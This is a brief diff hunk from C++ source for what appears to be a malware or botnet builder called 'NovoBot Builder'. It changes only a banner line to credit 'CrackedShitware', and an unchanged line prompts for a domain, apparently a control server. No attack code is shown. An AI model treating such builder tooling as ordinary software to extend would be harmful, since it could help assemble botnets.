@@ -11,7 +11,7 @@ int main()
 	string szPath;
 
 	
-	cout << "NovoBot Builder" << endl; 
+	cout << "NovoBot Builder - Created By CrackedShitware" << endl; 
 	cout << "Please enter your domain [example : domain.com] :";
 	getline(cin, szDomain);
 	cout << endl;
